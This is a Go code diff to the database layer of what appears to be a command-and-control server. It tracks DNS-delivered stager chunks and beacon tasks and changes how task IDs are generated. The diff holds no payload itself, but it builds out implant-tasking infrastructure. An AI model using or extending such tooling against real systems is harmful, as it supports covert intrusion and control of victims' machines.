@@ -22,8 +22,9 @@ const (
 
 // MasterDatabase wraps the SQL database connection for the master server
 type MasterDatabase struct {
-	db    *sql.DB
-	mutex sync.RWMutex
+	db          *sql.DB
+	mutex       sync.RWMutex
+	taskCounter int // Auto-increment counter for task IDs (TXXXX format)
 }
 
 // NewMasterDatabase creates a new master database connection and initializes schema
@@ -1587,13 +1588,14 @@ func (d *MasterDatabase) GetStagerChunk(sessionID string, chunkIndex int) (strin
 }
 
 // MarkStagerChunkDelivered marks a chunk as delivered (idempotent)
+// SHADOW MESH: Handles both pre-assigned chunks AND cache-served chunks
 func (d *MasterDatabase) MarkStagerChunkDelivered(sessionID string, chunkIndex int) error {
 	d.mutex.Lock()
 	defer d.mutex.Unlock()
 
 	now := time.Now().Unix()
 
-	// Check if chunk was already marked as delivered
+	// Check if chunk assignment exists (pre-assigned via Master)
 	var alreadyDelivered int
 	err := d.db.QueryRow(`
 		SELECT delivered FROM stager_chunk_assignments 
@@ -1601,20 +1603,50 @@ func (d *MasterDatabase) MarkStagerChunkDelivered(sessionID string, chunkIndex i
 	`, sessionID, chunkIndex).Scan(&alreadyDelivered)
 
 	if err != nil {
-		// Chunk assignment doesn't exist - this is fine for cache-served chunks
-		// Just update session activity without incrementing counter
-		d.db.Exec(`UPDATE stager_sessions SET last_activity = ? WHERE id = ?`, now, sessionID)
-		return nil
+		// Chunk assignment doesn't exist - this is a CACHE-SERVED chunk
+		// SHADOW MESH: DNS servers serve from cache without pre-assignments
+		// We need to track these chunks to show progress in UI!
+
+		// Insert a placeholder record to track this cache-served chunk
+		// Use INSERT OR IGNORE to handle race conditions from multiple DNS servers
+		result, insertErr := d.db.Exec(`
+			INSERT OR IGNORE INTO stager_chunk_assignments 
+			(session_id, chunk_index, dns_server_id, chunk_data, delivered, delivered_at)
+			VALUES (?, ?, 'cache-served', '', 1, ?)
+		`, sessionID, chunkIndex, now)
+
+		if insertErr != nil {
+			// Insert error (not a conflict) - just update activity
+			d.db.Exec(`UPDATE stager_sessions SET last_activity = ? WHERE id = ?`, now, sessionID)
+			return nil
+		}
+
+		// Check if row was actually inserted (rowsAffected = 0 means conflict, already exists)
+		rowsAffected, _ := result.RowsAffected()
+		if rowsAffected == 0 {
+			// Chunk already reported by another DNS server - just update activity
+			d.db.Exec(`UPDATE stager_sessions SET last_activity = ? WHERE id = ?`, now, sessionID)
+			return nil
+		}
+
+		// Successfully inserted new chunk - increment chunks_delivered counter
+		_, err = d.db.Exec(`
+			UPDATE stager_sessions 
+			SET chunks_delivered = chunks_delivered + 1, last_activity = ?
+			WHERE id = ?
+		`, now, sessionID)
+
+		return err
 	}
 
-	// If already delivered, don't increment counter (prevents duplicate counting)
+	// Chunk assignment exists - check if already delivered (prevent duplicate counting)
 	if alreadyDelivered == 1 {
-		// Just update activity timestamp
+		// Already delivered - just update activity timestamp
 		d.db.Exec(`UPDATE stager_sessions SET last_activity = ? WHERE id = ?`, now, sessionID)
 		return nil
 	}
 
-	// Mark chunk as delivered (first time)
+	// Mark pre-assigned chunk as delivered (first time)
 	_, err = d.db.Exec(`
 		UPDATE stager_chunk_assignments 
 		SET delivered = 1, delivered_at = ? 
@@ -2005,7 +2037,7 @@ func (d *MasterDatabase) CreateBroadcastTask(command, createdBy string) error {
 		}
 
 		// Generate unique task ID
-		taskID := generateTaskID()
+		taskID := d.generateTaskID()
 
 		// Insert task
 		_, err := d.db.Exec(`
@@ -2025,13 +2057,11 @@ func (d *MasterDatabase) CreateBroadcastTask(command, createdBy string) error {
 	return nil
 }
 
-// generateTaskID creates a unique task identifier
-func generateTaskID() string {
-	return fmt.Sprintf("task_%d_%d", time.Now().UnixNano(), randomInt(10000, 99999))
-}
-
-func randomInt(min, max int) int {
-	return min + int(time.Now().UnixNano()%(int64(max-min)))
+// generateTaskID creates a unique task identifier in TXXXX format
+// Must be called with mutex held by caller
+func (d *MasterDatabase) generateTaskID() string {
+	d.taskCounter++
+	return fmt.Sprintf("T%04d", d.taskCounter)
 }
 
 // GetEnabledDNSDomains returns a list of all enabled DNS domains
@@ -2079,7 +2109,7 @@ func (d *MasterDatabase) CreateTask(beaconID, command, createdBy string) (string
 	}
 
 	// Generate task ID
-	taskID := generateTaskID()
+	taskID := d.generateTaskID()
 	now := time.Now().Unix()
 
 	// Create task WITHOUT assigned_dns_server (available to all)
